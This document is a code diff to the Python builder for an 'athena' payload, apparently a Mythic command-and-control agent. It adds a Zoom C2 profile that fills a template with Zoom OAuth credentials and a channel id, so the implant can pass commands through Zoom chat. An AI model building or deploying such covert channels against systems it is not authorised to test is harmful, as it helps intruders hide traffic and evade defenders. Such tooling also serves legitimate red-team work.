@@ -145,7 +145,7 @@ class athena(PayloadType):
         #     description="Hide the window when running the payload"
         # ),
     ]
-    c2_profiles = ["http", "websocket", "slack", "smb", "discord", "github"]
+    c2_profiles = ["http", "websocket", "slack", "smb", "discord", "github", "zoom"]
 
     async def prepareWinExe(self, output_path):
         pe = pefile.PE(os.path.join(output_path, "{}.exe".format(self.get_parameter("assemblyname"))))
@@ -241,6 +241,29 @@ class athena(PayloadType):
         with open("{}/Agent.Profiles.Http/HttpProfile.cs".format(agent_build_path.name), "w") as f:
             f.write(baseConfigFile)
         self.addProfile(agent_build_path, "Http")
+
+    async def buildZoom(self, agent_build_path, c2):
+        baseConfigFile = open("{}/Agent.Profiles.Zoom/Base.txt".format(agent_build_path.name), "r").read()
+        baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
+        d = c2.get_parameters_dict()
+        def lookup(name, default=""):
+            v = d.get(name, default)
+            return str(v) if v is not None and v != "" else default
+        # Fixed %ZOOM_*% placeholders. This is robust to the C2 parameter being
+        # named either "zoom_account_id" (current zoom-c2) or "account_id"
+        # (older installs), and crucially never substitutes the literal OAuth
+        # "account_id" form-field key in GetToken — which the bare-token approach
+        # corrupted (causing 400 invalid_request).
+        baseConfigFile = baseConfigFile.replace("%ZOOM_ACCOUNT_ID%", lookup("zoom_account_id") or lookup("account_id"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_CLIENT_ID%", lookup("client_id"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_CLIENT_SECRET%", lookup("client_secret"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_USER_ID%", lookup("user_id", "me"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_CHANNEL_ID%", lookup("channel_id"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_API_BASE%", lookup("api_base", "https://api.zoom.us/v2"))
+        baseConfigFile = baseConfigFile.replace("%ZOOM_OAUTH_BASE%", lookup("oauth_base", "https://zoom.us/oauth"))
+        with open("{}/Agent.Profiles.Zoom/ZoomProfile.cs".format(agent_build_path.name), "w") as f:
+            f.write(baseConfigFile)
+        self.addProfile(agent_build_path, "Zoom")
 
     async def buildWebsocket(self, agent_build_path, c2):
         baseConfigFile = open("{}/Agent.Profiles.Websocket/Base.txt".format(agent_build_path.name), "r").read()
@@ -429,6 +452,9 @@ class athena(PayloadType):
                 elif profile["name"] == "github":
                     roots_replace += "<assembly fullname=\"Agent.Profiles.GitHub\"/>" + '\n'
                     await self.buildGitHub(agent_build_path, c2)
+                elif profile["name"] == "zoom":
+                    roots_replace += "<assembly fullname=\"Agent.Profiles.Zoom\"/>" + '\n'
+                    await self.buildZoom(agent_build_path, c2)
                 else:
                     raise Exception("Unsupported C2 profile type for Athena: {}".format(profile["name"]))
             
